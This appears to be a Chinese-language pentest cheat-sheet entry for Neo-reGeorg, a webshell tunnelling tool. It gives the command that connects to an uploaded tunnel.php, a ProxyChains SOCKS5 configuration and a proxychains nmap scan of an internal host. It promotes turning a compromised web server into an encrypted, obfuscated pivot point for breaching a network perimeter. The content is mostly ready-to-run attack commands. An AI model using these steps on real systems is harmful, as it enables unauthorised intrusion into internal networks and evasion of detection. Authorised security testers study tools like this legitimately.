### Neo-reGeorg

| 属性 | 值 |
|------|-----|
| 版本 | 3.8.0 |
| 平台 | Web |
| 风险 | 🟠 中 |
| 标签 | `WebShell` `代理` `隧道` |

## Neo-reGeorg HTTP 隧道代理

### 攻击机启动客户端连接到上传的 tunnel.php
```bash
python3 neoreg.py -k mysecretkey -u http://192.168.1.50/tunnel.php
```

### 配置 ProxyChains 使用建立的 SOCKS5 代理
```bash
[ProxyList]
socks5 127.0.0.1 1080
```

### 通过代理访问内网
```bash
proxychains4 nmap -sT -Pn 192.168.1.10
```

- ✓ 将 Web 服务器转化为 SOCKS5 代理节点
- ✓ 流量经过加密和混淆
- 适用于仅暴露 Web 服务的边界突破
